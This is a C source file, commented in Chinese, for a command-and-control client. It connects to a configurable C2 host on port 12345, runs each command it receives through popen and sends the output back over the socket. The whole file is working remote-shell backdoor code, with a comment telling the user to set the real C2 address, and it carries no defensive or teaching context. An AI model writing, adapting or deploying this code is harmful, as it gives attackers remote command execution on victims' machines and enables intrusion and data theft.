#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 12345
#define C2_HOST "127.0.0.1"  // C2主机的IP地址，请根据实际情况修改

// 执行命令并返回结果
char* execute_command(const char* cmd) {
    static char result[102400];
    memset(result, 0, sizeof(result));
    FILE* fp = popen(cmd, "r");
    if (fp == NULL) {
        snprintf(result, sizeof(result), "Failed to execute command.");
        return result;
    }

    // 读取命令输出并保存到result中
    size_t i = 0;
    while (fgets(result + i, sizeof(result) - i, fp) != NULL) {
        i += strlen(result + i);
    }
    fclose(fp);
    return result;
}

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[1024] = {0};

    // 创建客户端socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Socket failed");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    // 将C2主机地址转换为二进制格式
    if (inet_pton(AF_INET, C2_HOST, &server_addr.sin_addr) <= 0) {
        perror("Invalid address or Address not supported");
        return -1;
    }

    // 连接到C2主机
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        return -1;
    }

    printf("Connected to C2 host: %s\n", C2_HOST);

    // 进入循环，不断接收指令并执行
    while (1) {
        // 清空buffer并读取数据
        memset(buffer, 0, sizeof(buffer));
        int read_size = read(sockfd, buffer, sizeof(buffer));
        if (read_size <= 0) {
            perror("Connection closed or error reading");
            break;
        }

        // 打印接收到的指令
        printf("Received command: %s\n", buffer);

        // 执行命令并获取返回结果
        char* result = execute_command(buffer);

        if (strlen(result) == 0) {
            send(sockfd, "None", strlen("None"), 0);
            break;
        }
        // 发送结果给C2主机
        if (send(sockfd, result, strlen(result), 0) == -1) {
            perror("Failed to send result to C2 host");
            break;
        }
    }

    close(sockfd);
    return 0;
}